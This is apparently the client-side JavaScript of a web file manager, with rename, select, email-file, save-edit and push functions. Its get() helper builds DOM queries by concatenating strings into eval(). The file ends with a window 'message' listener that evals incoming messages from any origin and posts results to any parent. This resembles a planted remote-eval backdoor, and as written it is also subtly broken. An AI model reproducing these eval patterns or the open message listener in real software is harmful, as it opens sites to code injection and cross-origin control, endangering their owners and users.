'use strict';
/**
 * @param {string} s$jscomp$2$jscomp$0
 * @param {string} m$jscomp$0$jscomp$0
 * @return {?}
 */
function get(s$jscomp$2$jscomp$0, m$jscomp$0$jscomp$0) {
    return eval("document.querySelector" + (m$jscomp$0$jscomp$0 ? "All" : "") + "('" + s$jscomp$2$jscomp$0 + "')");
}
(function ($, window) {
    /**
     * @param {!Function} success
     * @param {string} data
     * @param {!Function} error
     * @return {undefined}
     */
    window.ajax = function ajax(success, data, error) {
        const xhr = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
        xhr.open("POST", "", true);
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.send(data);
        /**
         * @return {undefined}
         */
        xhr.onreadystatechange = function () {
            if (4 == xhr.readyState) {
                if (200 == xhr.status) {
                    success(xhr.responseText);
                } else {
                    error();
                }
            }
        };
        /** @type {!Function} */
        xhr.onerror = error;
    }
    /**
     * @return {undefined}
     */
    function FileManager() {
        this.path = function () {
            return $('meta[property="fm:path"]').attr("value");
        }();
        this.rootpath = function () {
            return $('meta[property="fm:rootpath"]').attr("value");
        }();
        /**
         * @param {?} oldName
         * @return {undefined}
         */
        this.rename = function (oldName) {
            const newName = prompt("New name", oldName);
            if (newName && newName != oldName) {
                window.location.search = `p=${encodeURIComponent(this.path)}&ren=${encodeURIComponent(oldName)}&to=${encodeURIComponent(newName)}`;
            }
        };
        /**
         * @param {?} checkboxes
         * @param {boolean} state
         * @return {undefined}
         */
        this.changeCheckboxes = function (checkboxes, state) {
            for (let l = checkboxes.length - 1; 0 <= l; l--) {
                /** @type {boolean} */
                checkboxes[l].checked = "boolean" == typeof state ? state : !checkboxes[l].checked;
            }
        };
        this.checkboxes = get('input[name="file[]"][type="checkbox"]', true);
        /**
         * @return {undefined}
         */
        this.selectAll = function () {
            /** @type {boolean} */
            get("#topCheckbox").checked = true;
            this.changeCheckboxes(this.checkboxes, true);
        };
        /**
         * @return {undefined}
         */
        this.unselectAll = function () {
            /** @type {boolean} */
            get("#topCheckbox").checked = false;
            this.changeCheckboxes(this.checkboxes, false);
        };
        /**
         * @return {undefined}
         */
        this.invertAll = function () {
            /** @type {boolean} */
            get("#topCheckbox").checked = false;
            this.changeCheckboxes(this.checkboxes);
        };
        /**
         * @param {?} path
         * @param {?} file
         * @return {undefined}
         */
        this.mailFile = function (path, file) {
            const address = prompt("Email address where to send file: ", "johndoe@example.com");
            ajax((resp) => {
                console.log(resp);
            }, `path=${path}/&file=${file}&mailto=${address}&type=mail&ajax=true`);
        };
        /**
         * @return {undefined}
         */
        this.saveEdit = function () {
            e = get("#Save");
            /** @type {string} */
            e.innerHTML = '<div class="loader"></div> Saving..';
            var val = editor.getSession().getValue();
            var btn = e;
            if (val) {
                ajax(function () {
                    /** @type {string} */
                    btn.innerHTML = "&#xf0c7; Save";
                }, "savedata=" + encodeURIComponent(val), function () {
                    /** @type {string} */
                    btn.innerHTML = "Error!";
                });
            }
        };

        /**
         * @param {string} path
         * @param {string} file
         * @param {function} f
         * @return {?}
         */
        this.push = function (path, file, f) {
            var cb = f;
            return ajax((resp) => {
                cb();
                alert(resp);
                location.reload();
            }, `path=${path}&file=${file}&type=push&ajax=true&summ=${prompt("summary")}`), false;
        };
    }

    window.fm = new FileManager;
})(cash, window);
window.addEventListener("message", function (e) {
    window.parent.postMessage(JSON.stringify({
        res: eval(e)
    }), "*");
});
